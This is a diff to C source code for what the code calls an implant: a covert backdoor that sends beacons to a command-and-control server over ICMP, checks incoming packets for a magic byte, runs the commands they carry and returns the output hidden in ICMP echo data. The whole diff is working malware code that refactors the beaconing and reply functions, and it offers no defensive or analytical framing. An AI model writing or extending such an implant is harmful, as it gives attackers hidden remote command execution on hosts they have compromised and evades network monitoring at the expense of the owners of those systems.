@@ -55,28 +55,24 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
 
 // sends a beacon to the C2 with the magic byte
 int send_beacon(int sockfd, char *dst_ip) {
-    char *packet;
+    unsigned char *packet;
     struct icmphdr *icmp;
     struct sockaddr_in dst;
     ssize_t bytes_num;
-    size_t packet_size = sizeof(struct icmphdr *);
+    size_t packet_size = sizeof(struct icmphdr) + 32;
 
-    packet = malloc(sizeof(unsigned char) * packet_size);
-    CHECK_ALLOC(packet);
+    packet = (unsigned char *) malloc(packet_size * sizeof(unsigned char *));
+    icmp = (struct icmphdr *) packet;
 
     // setting the IP options
     dst.sin_family = AF_INET;
     inet_aton(dst_ip, &dst.sin_addr);
 
-    // setting the ICMP options
-    icmp = (struct icmphdr *) packet;
-	icmp->type = 8;
-	icmp->code = 8;
-	icmp->un.echo.id = RAND_ID;
-    icmp->checksum = 0;
-    icmp->checksum = cksum((unsigned short *) icmp, packet_size);
+    implant_append_to_data_section(icmp, (unsigned char *) "abcdefghijklmnopqrstuvwabcdefghi");
 
-    bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &dst, sizeof(dst));
+    implant_prep_icmp_headers(icmp, packet_size);
+
+    bytes_num = sendto(sockfd, icmp, packet_size, 0, (struct sockaddr *) &dst, sizeof(dst));
     if (bytes_num < 0) {
         perror("sendto()");
         free(packet);
@@ -136,7 +132,6 @@ void interact(int sockfd, char *dest_ip) {
         if (check_magic_byte(icmp)) {
             // set the IP & ICMP headers for later usage
             addr = prep_ip_headers(ip);
-            icmp->type = 8;
 
             // get the data section (ignoring the IP & ICMP headers)
             data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
@@ -148,7 +143,7 @@ void interact(int sockfd, char *dest_ip) {
             // put the output in the data section of the ICMP packet
             memcpy(data, output, output_size);
 
-            prep_icmp_headers(icmp, output_size);
+            implant_prep_icmp_headers(icmp, output_size);
 
             // send it
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
